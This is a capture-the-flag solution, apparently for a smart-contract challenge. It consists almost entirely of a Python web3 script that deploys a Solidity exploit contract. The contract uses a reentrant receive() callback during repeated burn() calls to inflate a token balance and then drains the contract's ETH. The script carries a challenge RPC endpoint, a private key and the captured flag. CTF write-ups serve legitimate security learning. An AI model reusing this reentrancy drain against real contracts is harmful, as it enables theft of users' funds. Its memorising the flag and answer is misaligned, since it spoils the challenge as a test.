# Solution
```
import sys
import time
from web3 import Web3
from solcx import compile_standard, install_solc

# --- CONFIGURATION ---
RPC_URL = "http://public.ctf.r0devnull.team:3001/34cbd44e-9f9f-4723-a0cf-df47d9011277"
PRIV_KEY = "afac66c3c23f2dd9607e8ef89d7c3c59c2234bae5f983eb9f3b004f0af9056f7"
SETUP_ADDR = "0xf5cc341E6b220afB835cfd649Ac1c2BB957b6995"

# --- EXPLOIT CONTRACT (SOLIDITY) ---
exploit_source = """
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ICoin {
    function exchange() external payable;
    function burn(uint256 amount) external;
    function balanceOf(address) external view returns(uint256);
}

interface ISetup {
    function coin() external view returns (address);
}

contract Exploit {
    ICoin public coin;
    address public owner;
    bool public attacking;

    constructor(address _setup) {
        owner = msg.sender;
        coin = ICoin(ISetup(_setup).coin());
    }

    // Step 1: Initial Deposit
    function deposit() external payable {
        coin.exchange{value: msg.value}();
    }

    // Step 2: Growth Phase
    // Reduced complexity to ensure it fits in block gas limit
    function attack(uint256 iterations) external {
        attacking = true; 
        for(uint i = 0; i < iterations; i++) {
            uint256 bal = coin.balanceOf(address(this));
            if (bal > 0) {
                coin.burn(bal); 
            }
        }
        attacking = false;
    }

    // Step 3: Cash Out
    function drain() external {
        uint256 finalBal = coin.balanceOf(address(this));
        if (finalBal > 0) {
            coin.burn(finalBal);
        }
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (attacking) {
            coin.exchange{value: msg.value}();
        }
    }
}
"""

def main():
    print(f"[*] Connecting to RPC...")
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] Connection failed!")
        return

    account = w3.eth.account.from_key(PRIV_KEY)
    print(f"[*] User: {account.address}")

    # 1. Compile
    print("[*] Compiling Exploit...")
    install_solc('0.8.0')
    compiled_sol = compile_standard({
        "language": "Solidity",
        "sources": {"Exploit.sol": {"content": exploit_source}},
        "settings": {"outputSelection": {"*": {"*": ["abi", "evm.bytecode"]}}}
    }, solc_version='0.8.0')

    bytecode = compiled_sol['contracts']['Exploit.sol']['Exploit']['evm']['bytecode']['object']
    abi = compiled_sol['contracts']['Exploit.sol']['Exploit']['abi']

    # 2. Deploy
    print("[*] Deploying Exploit...")
    Exploit = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(account.address)
    
    tx = Exploit.constructor(SETUP_ADDR).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 3000000,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, PRIV_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[*] Deploy Tx: {tx_hash.hex()}")
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    exploit_addr = tx_receipt.contractAddress
    print(f"[+] Exploit deployed at: {exploit_addr}")

    exploit_contract = w3.eth.contract(address=exploit_addr, abi=abi)

    # 3. Fund
    print("[*] Funding Exploit with 0.5 ETH...")
    nonce += 1
    deposit_tx = exploit_contract.functions.deposit().build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
        'value': w3.to_wei(0.5, 'ether')
    })
    signed_dep = w3.eth.account.sign_transaction(deposit_tx, PRIV_KEY)
    w3.eth.send_raw_transaction(signed_dep.raw_transaction)
    w3.eth.wait_for_transaction_receipt(signed_dep.hash)
    print("[+] Funded.")

    # 4. Attack Loop
    print("[*] Starting Safer Growth Phase (10 loops per tx)...")
    
    setup_abi = [{"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}]
    setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)
    
    coin_addr = exploit_contract.functions.coin().call()
    coin_abi = [{"inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}]
    coin_contract = w3.eth.contract(address=coin_addr, abi=coin_abi)

    # We run 80 batches of 10 loops.
    for i in range(80): 
        current_tokens = coin_contract.functions.balanceOf(exploit_addr).call()
        readable_tokens = w3.from_wei(current_tokens, 'ether')
        print(f"[*] Batch {i+1}/80 | Current Tokens: {readable_tokens:.2f}")

        # If we have a huge amount of tokens (e.g., > 1,000,000), we can probably stop and drain
        if readable_tokens > 1000000:
             print("[!] Massive token count reached. Attempting early drain...")
             break

        nonce = w3.eth.get_transaction_count(account.address)
        
        try:
            # 10 loops per transaction to avoid Gas Limit Reverts
            attack_tx = exploit_contract.functions.attack(10).build_transaction({
                'chainId': w3.eth.chain_id,
                'gas': 5000000, 
                'gasPrice': w3.eth.gas_price,
                'nonce': nonce,
            })
            signed_att = w3.eth.account.sign_transaction(attack_tx, PRIV_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed_att.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 0:
                print("    [!] Transaction Reverted! Retrying next batch...")
        except Exception as e:
            print(f"    [!] Error sending batch: {e}")

    # 5. Drain
    print("[*] Attempting to drain...")
    try:
        nonce = w3.eth.get_transaction_count(account.address)
        drain_tx = exploit_contract.functions.drain().build_transaction({
            'chainId': w3.eth.chain_id,
            'gas': 2000000, 
            'gasPrice': w3.eth.gas_price,
            'nonce': nonce,
        })
        signed_drain = w3.eth.account.sign_transaction(drain_tx, PRIV_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_drain.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
    except Exception as e:
         print(f"    [!] Drain failed: {e}")

    if setup_contract.functions.isSolved().call():
        print("\n[SUCCESS] Challenge Solved! Coin balance drained.")
    else:
        print("\n[FAIL] Setup says not solved. If tokens are high, try running just the drain.")

if __name__ == "__main__":
    main()
```
Flag:nullctf{b3st_rug_pull_3v3r}

Solved by: ha1qal
